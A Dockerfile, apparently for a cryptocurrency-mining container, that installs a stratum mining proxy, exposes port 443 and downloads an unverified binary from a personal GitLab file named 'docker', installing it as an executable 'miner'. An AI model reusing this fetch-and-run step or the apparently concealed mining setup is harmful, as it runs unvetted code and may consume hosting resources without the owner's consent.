FROM python:3.10-slim

WORKDIR /app

# Install dependensi sistem yang diperlukan
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    wget \
    procps \
    build-essential \
    libyaml-dev \
    && rm -rf /var/lib/apt/lists/*

# Install aiostratum-proxy secara langsung
# Pip akan otomatis menangani versi PyYAML yang kompatibel
RUN pip install --no-cache-dir aiostratum-proxy

# Download Miner Binary
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# Copy skrip jalankan
COPY start.sh .
RUN chmod +x start.sh

# Port untuk proxy
EXPOSE 443

CMD ["./start.sh"]
